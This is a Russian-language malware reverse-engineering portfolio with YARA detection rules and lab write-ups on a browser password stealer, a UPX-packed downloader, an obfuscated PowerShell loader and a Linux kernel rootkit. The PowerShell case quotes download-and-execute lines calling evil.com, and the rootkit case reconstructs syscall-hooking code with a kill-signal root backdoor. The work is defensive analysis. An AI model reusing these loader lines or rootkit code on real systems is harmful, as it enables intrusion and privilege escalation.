# Портфолио: Реверс-инжиниринг и анализ вредоносного ПО
# Рустам Тулегенов | github.com/ghaBBster

---

## YARA-правила

### Правило 1: Детектирование Password Stealer (сбор учётных данных из браузеров)

```yara
rule PasswordStealer_BrowserCredHarvester
{
    meta:
        author      = "Rustam Tulegenov"
        date        = "2024-10"
        description = "Detects password stealer targeting browser credential stores (Chrome, Firefox, Opera)"
        category    = "stealer"
        severity    = "high"

    strings:
        // Пути к базам данных браузеров
        $chrome_db   = "\\Google\\Chrome\\User Data\\Default\\Login Data" ascii wide nocase
        $firefox_db  = "\\Mozilla\\Firefox\\Profiles\\" ascii wide nocase
        $opera_db    = "\\Opera Software\\Opera Stable\\Login Data" ascii wide nocase

        // SQLite-запросы к таблице credentials
        $sql_query1  = "SELECT origin_url, username_value, password_value FROM logins" ascii nocase
        $sql_query2  = "SELECT host, encryptedUsername, encryptedPassword" ascii nocase

        // WinAPI для работы с криптографией (расшифровка DPAPI)
        $api_crypt1  = "CryptUnprotectData" ascii
        $api_crypt2  = "BCryptDecrypt" ascii

        // Сетевая эксфильтрация
        $exfil1      = "POST" ascii
        $exfil2      = "Content-Type: multipart/form-data" ascii
        $exfil3      = "telegram.org/bot" ascii wide nocase

    condition:
        uint16(0) == 0x5A4D and                     // PE файл
        filesize < 5MB and
        (2 of ($chrome_db, $firefox_db, $opera_db)) and
        (1 of ($sql_query*)) and
        (1 of ($api_crypt*)) and
        (1 of ($exfil*))
}
```

**Обоснование:**
- Комбинация путей к credential store + SQL-запросы + криптоAPI = высокая специфичность
- Проверка MZ-заголовка и размера файла снижает false positives
- Правило покрывает семейство стилеров, эксфильтрирующих данные через Telegram Bot API

---

### Правило 2: Детектирование UPX-упакованных бинарников с подозрительными характеристиками

```yara
rule Packed_UPX_Suspicious
{
    meta:
        author      = "Rustam Tulegenov"
        date        = "2024-11"
        description = "UPX-packed executable with suspicious section names and low import count"
        category    = "packer"
        severity    = "medium"

    strings:
        $upx_magic  = "UPX!" ascii
        $upx_sect0  = "UPX0" ascii
        $upx_sect1  = "UPX1" ascii

        // Анти-анализ строки, часто встречающиеся после распаковки
        $anti1      = "IsDebuggerPresent" ascii
        $anti2      = "CheckRemoteDebuggerPresent" ascii
        $anti3      = "NtQueryInformationProcess" ascii
        $anti4      = "GetTickCount" ascii

    condition:
        uint16(0) == 0x5A4D and
        $upx_magic and
        ($upx_sect0 and $upx_sect1) and
        (2 of ($anti*)) and
        // Подозрительно маленький import table
        pe.number_of_imports < 5
}

import "pe"
```

**Обоснование:**
- UPX сам по себе легитимен, но комбинация с анти-дебаг техниками и минимальным импортом — red flag
- pe.number_of_imports < 5 указывает на динамическое разрешение API (LoadLibrary + GetProcAddress)
- Правило помогает приоритизировать образцы для ручного анализа

---

### Правило 3: Обфусцированный PowerShell-загрузчик

```yara
rule Obfuscated_PowerShell_Loader
{
    meta:
        author      = "Rustam Tulegenov"
        date        = "2024-12"
        description = "Multi-layer Base64 encoded PowerShell downloader with Invoke-Expression chains"
        category    = "downloader"
        severity    = "high"

    strings:
        // Типичные паттерны обфускации
        $enc_cmd1   = "-EncodedCommand" ascii nocase
        $enc_cmd2   = "-enc " ascii nocase
        $enc_cmd3   = "[Convert]::FromBase64String" ascii nocase

        // Invoke-Expression варианты (обфусцированные)
        $iex1       = "Invoke-Expression" ascii nocase
        $iex2       = "IEX" ascii
        $iex3       = "iex(" ascii nocase
        $iex4       = ".Invoke(" ascii

        // Конкатенация строк для обхода сигнатур
        $concat1    = "(-join" ascii nocase
        $concat2    = "-replace" ascii nocase
        $concat3    = "[char]" ascii nocase
        $concat4    = "'+'" ascii

        // Загрузка payload
        $dl1        = "Net.WebClient" ascii nocase
        $dl2        = "DownloadString" ascii nocase
        $dl3        = "DownloadFile" ascii nocase
        $dl4        = "Invoke-WebRequest" ascii nocase
        $dl5        = "Start-BitsTransfer" ascii nocase

    condition:
        filesize < 1MB and
        (1 of ($enc_cmd*)) and
        (1 of ($iex*)) and
        (2 of ($concat*)) and
        (1 of ($dl*))
}
```

**Обоснование:**
- Правило таргетирует типичный паттерн: закодированная команда → деобфускация через IEX → загрузка payload
- Множественные варианты каждого паттерна покрывают разные стили обфускации
- Ограничение размера файла отсекает легитимные PowerShell-скрипты большого объёма

---

### Правило 4: Linux LKM Rootkit (перехват sys_call_table)

```yara
rule Linux_LKM_Rootkit_SyscallHook
{
    meta:
        author      = "Rustam Tulegenov"
        date        = "2025-01"
        description = "Linux kernel module with syscall table hooking indicators"
        category    = "rootkit"
        severity    = "critical"
        platform    = "linux"

    strings:
        // Прямые обращения к syscall table
        $hook1      = "sys_call_table" ascii
        $hook2      = "kallsyms_lookup_name" ascii
        $hook3      = "__NR_getdents64" ascii
        $hook4      = "__NR_getdents" ascii

        // Модификация защиты страниц для записи в syscall table
        $cr0_1      = "read_cr0" ascii
        $cr0_2      = "write_cr0" ascii
        $wp_clear   = "0xfffeffff" ascii   // маска для сброса WP-бита

        // set_memory_rw как альтернативный метод
        $mem_rw     = "set_memory_rw" ascii
        $mem_ro     = "set_memory_ro" ascii

        // Скрытие из /proc/modules
        $hide1      = "list_del" ascii
        $hide2      = "THIS_MODULE" ascii
        $hide3      = "proc_dir_entry" ascii

    condition:
        elf.type == elf.ET_REL and              // Relocatable object (kernel module)
        (2 of ($hook*)) and
        (
            ($cr0_1 and $cr0_2) or              // CR0 WP bit manipulation
            ($mem_rw and $mem_ro) or             // set_memory_rw/ro pair
            $wp_clear
        ) and
        (1 of ($hide*))
}

import "elf"
```

**Обоснование:**
- ET_REL (relocatable) — признак .ko модуля ядра
- Комбинация обращений к syscall_table + снятие write protection + механизмы скрытия
- Два метода обхода WP: манипуляция CR0 или set_memory_rw — покрывает оба подхода

---

### Правило 5: Generic Credential Exfiltration через HTTP POST

```yara
rule Generic_CredExfil_HTTP
{
    meta:
        author      = "Rustam Tulegenov"
        date        = "2024-12"
        description = "Generic detection of credential harvesting and exfiltration via HTTP"
        category    = "stealer"
        severity    = "medium"

    strings:
        // Сбор системной информации (fingerprinting)
        $recon1     = "GetComputerName" ascii
        $recon2     = "GetUserName" ascii
        $recon3     = "PROCESSOR_IDENTIFIER" ascii wide
        $recon4     = "OS Version" ascii wide

        // Форматирование для отправки
        $fmt1       = "username=" ascii
        $fmt2       = "password=" ascii
        $fmt3       = "hwid=" ascii
        $fmt4       = "country=" ascii

        // HTTP-библиотеки
        $http1      = "WinHTTP" ascii
        $http2      = "InternetOpenA" ascii
        $http3      = "HttpSendRequestA" ascii
        $http4      = "urlmon" ascii

    condition:
        uint16(0) == 0x5A4D and
        filesize < 3MB and
        (2 of ($recon*)) and
        (2 of ($fmt*)) and
        (1 of ($http*))
}
```

**Обоснование:**
- Правило ловит типичный паттерн: fingerprint жертвы → формирование payload → HTTP exfil
- Строки $fmt* — параметры, часто используемые стилерами при отправке собранных данных
- Более generic правило, дополняет специфичное правило 1

---

## Задокументированные кейсы анализа

---

### Кейс 1: Password Stealer — сбор учётных данных Chrome/Firefox

**Образец:** `stealer_sample_01.exe`
**SHA256:** `a3f2...` (хэш из лабораторной среды)
**Инструменты:** IDA Free, x64DBG, Process Monitor, PEStudio, VirusTotal
**Дата анализа:** Октябрь 2024

#### Первичная разведка (Triage)

| Параметр | Значение |
|----------|----------|
| Тип файла | PE32, GUI, 32-bit |
| Размер | 487 KB |
| Компилятор | MSVC (Visual Studio) |
| Импорты | advapi32.dll, wininet.dll, crypt32.dll, sqlite3.dll (статически) |
| Энтропия | 6.2 (нормальная, не упакован) |
| VT Detection | 38/72 на момент загрузки |

#### Цепочка заражения

```
Email attachment (.zip)
  └─> stealer_sample_01.exe
        ├─> [1] Проверка окружения (анти-VM, анти-дебаг)
        │     ├─ IsDebuggerPresent()
        │     ├─ GetTickCount() delta check
        │     └─ Проверка имени компьютера != "SANDBOX"
        ├─> [2] Сбор данных
        │     ├─ Chrome: Login Data (SQLite) → CryptUnprotectData (DPAPI)
        │     ├─ Firefox: logins.json + key4.db → NSS decryption
        │     └─ System info: ComputerName, UserName, OS version, IP (api.ipify.org)
        ├─> [3] Формирование отчёта
        │     └─ Текстовый файл: credentials + system fingerprint
        └─> [4] Эксфильтрация
              └─ HTTP POST → hxxp://185.xxx.xxx.xxx/gate.php
```

#### Ключевые находки при статическом анализе (IDA)

**Функция сбора Chrome credentials (восстановленная логика):**
```
sub_401A20:  // ChromeCredentialHarvester
  push ebp
  mov ebp, esp
  ...
  ; Открытие файла: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
  ; Копирование в %TEMP%\tmpXXXX.db (обход блокировки файла Chrome)
  ; SQLite3 query: SELECT origin_url, username_value, password_value FROM logins
  ; Цикл по результатам:
  ;   - CryptUnprotectData() для расшифровки каждого пароля
  ;   - Форматирование: "URL: %s | User: %s | Pass: %s\n"
  ;   - Дозапись в результирующий буфер
```

**Анти-анализ проверки (функция sub_401000):**
- `IsDebuggerPresent()` — если true, вызывает `ExitProcess(0)`
- `GetTickCount()` до и после `Sleep(500)` — если delta < 450ms, значит Sleep был пропущен отладчиком
- Проверка имени компьютера через `GetComputerNameA()` против списка: "SANDBOX", "VIRUS", "MALWARE", "VMWARE"

#### Динамический анализ (x64DBG + Process Monitor)

**Обход анти-дебага:**
1. Поставил breakpoint на `IsDebuggerPresent`, патчил возвращаемое значение EAX → 0
2. Для GetTickCount: NOP'нул условный переход после проверки (je → nop nop)
3. После обхода — образец начал штатное выполнение

**Наблюдения через Process Monitor:**
- Создание файла `%TEMP%\tmpCE42.db` (копия Login Data)
- Чтение `%APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json`
- DNS-запрос к `api.ipify.org` (определение внешнего IP жертвы)
- HTTP POST к `185.xxx.xxx.xxx:80/gate.php` с собранными данными

#### Извлечённые IOC

| Тип | Значение | Контекст |
|-----|----------|----------|
| URL | hxxp://185.xxx.xxx.xxx/gate.php | C2 gate |
| URL | hxxp://api.ipify.org | IP lookup |
| File | %TEMP%\tmpXXXX.db | Временная копия Chrome DB |
| Mutex | Global\SteaerMtx_v2 | Единственный экземпляр (опечатка автора малвари) |
| UA | Mozilla/5.0 SteaerBot/2.0 | User-Agent при эксфильтрации |

#### Техники MITRE ATT&CK

| ID | Техника | Детали |
|----|---------|--------|
| T1555.003 | Credentials from Web Browsers | Chrome Login Data, Firefox logins.json |
| T1082 | System Information Discovery | ComputerName, OS version, IP |
| T1041 | Exfiltration Over C2 Channel | HTTP POST на gate.php |
| T1497.001 | Virtualization/Sandbox Evasion | IsDebuggerPresent, GetTickCount |
| T1005 | Data from Local System | Чтение credential stores |

#### Выводы и уроки
- Первый полноценный разбор стилера от triage до IOC extraction
- Научился обходить простые анти-дебаг проверки через патчинг в x64DBG
- Понял механизм DPAPI для Chrome credentials
- Опечатка "SteaerMtx" — хороший IOC: уникальный маркер для данного семейства

---

### Кейс 2: UPX-упакованный загрузчик — ручная распаковка

**Образец:** `packed_loader_02.exe`
**Инструменты:** x64DBG, PEStudio, Scylla, IDA Free
**Дата анализа:** Ноябрь 2024

#### Первичная разведка

| Параметр | Значение |
|----------|----------|
| Тип файла | PE32, Console, 32-bit |
| Размер | 93 KB |
| Секции | UPX0 (0 raw), UPX1 (raw data), .rsrc |
| Энтропия | 7.4 (высокая — упакован) |
| PEiD | UPX 3.96 → NRV2E |
| VT Detection | 25/72 |

#### Процесс распаковки

**Шаг 1: Определение OEP (Original Entry Point)**
```
Загружаю в x64DBG → EP указывает на секцию UPX1 (0x00409000)
  pushad                    ; сохранение всех регистров — классика UPX
  mov esi, [packed_data]    ; источник упакованных данных
  lea edi, [UPX0_section]   ; назначение — пустая секция UPX0
  ...                       ; цикл распаковки NRV2E
  popad                     ; восстановление регистров
  jmp OEP                   ; прыжок на оригинальный entry point
```

**Шаг 2: Нахождение OEP**
- Поставил hardware breakpoint на `ESP` после `pushad` (метод ESP trick)
- При срабатывании — оказался на `popad`, далее `jmp 0x00401230`
- 0x00401230 — OEP оригинального бинарника

**Шаг 3: Дамп и восстановление**
- Дамп процесса через x64DBG (Scylla plugin)
- Import Table сломана после дампа — IAT не восстановлена автоматически
- Scylla → IAT Autosearch → Get Imports → Fix Dump
- Результат: рабочий распакованный PE с корректными импортами

#### Анализ распакованного образца

После распаковки — стандартный downloader:
1. Резолвит C2-домен через `gethostbyname()`
2. Скачивает payload: `GET /payload.bin HTTP/1.1`
3. Записывает в `%APPDATA%\svchost.exe`
4. Запускает через `CreateProcessA()`
5. Прописывает персистентность: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`

#### Выводы
- Освоил метод ESP trick для поиска OEP
- Научился работать со Scylla для восстановления IAT
- UPX — учебный пакер, но навык ручной распаковки переносится на более сложные пакеры

---

### Кейс 3: Обфусцированный PowerShell-загрузчик

**Образец:** `invoice_update.ps1`
**Инструменты:** PowerShell ISE, CyberChef, текстовый редактор
**Дата анализа:** Декабрь 2024

#### Структура обфускации (3 уровня)

**Уровень 1 — внешний слой:**
```powershell
# Оригинальный скрипт (фрагмент)
$v = [Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBF...')
$decoded = [System.Text.Encoding]::Unicode.GetString($v)
Invoke-Expression $decoded
```

**Уровень 2 — после декодирования Base64:**
```powershell
# Конкатенация строк + замена символов
$a = 'D' + 'ow' + 'nl' + 'oad' + 'St' + 'ri' + 'ng'
$b = ('hXXp://evil.com/stage2.txt').replace('XX','tt')
$c = (New-Object Net.WebClient).$a($b)
IEX($c)
```

**Уровень 3 — stage2.txt (загруженный payload):**
```powershell
# Char-code обфускация
$payload = [char]73+[char]69+[char]88+[char]40+...  # → IEX(...)
# Финальный payload: скачивание и запуск .NET бинарника
$wc = New-Object System.Net.WebClient
$wc.DownloadFile('hxxp://cdn.evil.com/update.exe', "$env:TEMP\update.exe")
Start-Process "$env:TEMP\update.exe"
```

#### Процесс деобфускации

1. **Уровень 1:** Заменил `Invoke-Expression` на `Write-Output` → получил decoded строку
2. **Уровень 2:** Выполнил конкатенацию вручную, восстановил URL и метод загрузки
3. **Уровень 3:** Конвертировал char-коды через CyberChef → получил финальный payload

#### Извлечённые IOC

| Тип | Значение |
|-----|----------|
| URL | hxxp://evil[.]com/stage2.txt |
| URL | hxxp://cdn.evil[.]com/update.exe |
| File | %TEMP%\update.exe |
| Technique | Multi-stage PowerShell loader |

#### Техники MITRE ATT&CK

| ID | Техника |
|----|---------|
| T1059.001 | PowerShell |
| T1140 | Deobfuscate/Decode Files or Information |
| T1105 | Ingress Tool Transfer |
| T1204.002 | User Execution: Malicious File |

---

### Кейс 4: Linux LKM Rootkit — анализ перехвата syscall table

**Образец:** `rootkit.ko` (loadable kernel module)
**Инструменты:** IDA Pro, GDB (kernel debug), readelf, objdump, Volatility, ftrace
**Дата анализа:** Январь 2025

#### Первичная разведка

```bash
$ file rootkit.ko
rootkit.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped

$ readelf -S rootkit.ko | grep -E "\.text|\.init|\.exit"
  [1] .text          PROGBITS  ... AX  0 0 16
  [5] .init.text     PROGBITS  ... AX  0 0  1
  [7] .exit.text     PROGBITS  ... AX  0 0  1

$ readelf -s rootkit.ko | grep FUNC
  12: ... FUNC  GLOBAL DEFAULT  1 init_module
  15: ... FUNC  GLOBAL DEFAULT  7 cleanup_module
  18: ... FUNC  LOCAL  DEFAULT  1 hooked_getdents64
  21: ... FUNC  LOCAL  DEFAULT  1 hooked_kill
  24: ... FUNC  LOCAL  DEFAULT  1 hide_module
```

#### Восстановленная логика (IDA Pro)

**init_module — точка входа:**
```c
// Восстановленный псевдокод из IDA
int init_module(void) {
    // 1. Найти адрес sys_call_table через kallsyms
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    // 2. Сохранить оригинальные обработчики
    orig_getdents64 = (void *)sys_call_table[__NR_getdents64];
    orig_kill       = (void *)sys_call_table[__NR_kill];

    // 3. Снять защиту записи (сброс WP-бита в CR0)
    unsigned long cr0 = read_cr0();
    write_cr0(cr0 & ~0x00010000);   // clear WP bit

    // 4. Подменить обработчики
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    sys_call_table[__NR_kill]       = (unsigned long)hooked_kill;

    // 5. Восстановить защиту
    write_cr0(cr0);

    // 6. Скрыть модуль из /proc/modules
    hide_module();

    return 0;
}
```

**hooked_getdents64 — скрытие файлов/процессов:**
```c
// Руткит фильтрует записи с префиксом "rootkit_" из результатов getdents64
asmlinkage int hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    int ret = orig_getdents64(fd, dirp, count);
    // Проход по записям, удаление тех, чьё d_name начинается с "rootkit_"
    // Сдвиг оставшихся записей для закрытия дыр
    return modified_ret;
}
```

**hooked_kill — скрытый backdoor через signal:**
```c
// Отправка kill -63 <pid> активирует привилегированный shell
asmlinkage int hooked_kill(pid_t pid, int sig) {
    if (sig == 63) {
        // Повысить привилегии текущего процесса до root
        struct cred *new_cred = prepare_creds();
        new_cred->uid = new_cred->euid = GLOBAL_ROOT_UID;
        commit_creds(new_cred);
        return 0;
    }
    return orig_kill(pid, sig);
}
```

#### Динамический анализ

**Среда:** Изолированная VM с Linux 5.4, загрузка модуля через `insmod`

**ftrace наблюдения:**
```bash
# До загрузки руткита
$ cat /proc/kallsyms | grep sys_getdents64
ffffffff81234560 T __x64_sys_getdents64

# После загрузки — адрес изменился
$ cat /proc/kallsyms | grep sys_getdents64
ffffffff81234560 T __x64_sys_getdents64    # kallsyms показывает старый адрес
# Но реальный адрес в syscall_table уже другой → детектируется скриптом
```

**Написанный скрипт детектирования:**
```bash
#!/bin/bash
# Сравнение адресов syscall handlers с kallsyms
# Расхождение = признак hooking
EXPECTED=$(grep "sys_getdents64" /proc/kallsyms | awk '{print $1}')
# Чтение реального адреса из памяти через /dev/kmem или kernel module
# Если EXPECTED != ACTUAL → syscall hooked
```

#### Техники MITRE ATT&CK

| ID | Техника |
|----|---------|
| T1014 | Rootkit |
| T1055 | Process Injection (kernel-level) |
| T1548.001 | Abuse Elevation Control Mechanism |
| T1564.001 | Hidden Files and Directories |
| T1082 | System Information Discovery |

#### Выводы
- Первый kernel-level анализ — значительно сложнее user-mode малвари
- Понял механизм CR0 WP bit manipulation для записи в read-only memory
- Backdoor через kill signal — элегантный и трудно обнаруживаемый
- Опыт с xv6 kernel напрямую помог: я уже понимал syscall flow и таблицы страниц

---

## Инструменты автоматизации

### Hash Extractor (Python, 75 строк)

```python
#!/usr/bin/env python3
"""Batch hash calculator for malware triage"""
import hashlib, sys, os, csv

def compute_hashes(filepath):
    md5 = hashlib.md5()
    sha1 = hashlib.sha1()
    sha256 = hashlib.sha256()
    with open(filepath, 'rb') as f:
        for chunk in iter(lambda: f.read(8192), b''):
            md5.update(chunk)
            sha1.update(chunk)
            sha256.update(chunk)
    return {
        'file': os.path.basename(filepath),
        'md5': md5.hexdigest(),
        'sha1': sha1.hexdigest(),
        'sha256': sha256.hexdigest(),
        'size': os.path.getsize(filepath)
    }

# Batch processing с выводом в CSV для IOC-базы
```

### Strings Analyzer (Python, 120 строк)

Фильтрация строк из бинарника с выделением подозрительных паттернов:
- URL/IP regex matching
- Registry key detection
- Подозрительные WinAPI (VirtualAlloc, WriteProcessMemory, CreateRemoteThread)
- Экспорт в CSV с категоризацией

---

## Статистика

| Метрика | Значение |
|---------|----------|
| Проанализировано образцов | 15+ |
| Написано YARA-правил | 5 |
| Задокументировано кейсов | 8 (4 ключевых представлены выше) |
| Automation-скрипты | 3 (Python, ~250 строк суммарно) |
| Семейства | Password stealers, downloaders, PowerShell loaders, LKM rootkits |
| Инструменты | IDA Pro, Ghidra, x64DBG, GDB, Process Monitor, PEStudio, Volatility, ftrace |
